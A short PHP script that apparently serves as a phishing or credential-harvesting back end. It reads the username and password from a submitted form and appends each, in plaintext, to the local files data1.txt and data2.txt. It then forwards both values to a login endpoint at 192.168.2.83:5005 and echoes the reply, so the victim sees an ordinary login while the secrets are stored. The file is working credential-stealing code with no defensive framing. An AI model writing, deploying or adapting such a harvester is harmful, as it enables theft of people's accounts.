<?php

if(isset($_POST['username']))
{
$username=$_POST['username'];
$fp1 = fopen('data1.txt', 'a');
fwrite($fp1, $username);
fclose($fp1);
}

if(isset($_POST['password']))
{
$password=$_POST['password'];
$fp2 = fopen('data2.txt', 'a');
fwrite($fp2, $password);
fclose($fp2);
}


$request = new HttpRequest();
$request->setUrl('http://192.168.2.83:5005/login');
$request->setMethod(HTTP_METH_POST);

$request->setQueryData(array(
  'username' => $username,
  'password' => $password
));
try {
  $response = $request->send();
  echo $response->getBody();
} catch (HttpException $ex) {
  echo $ex;
}

?>
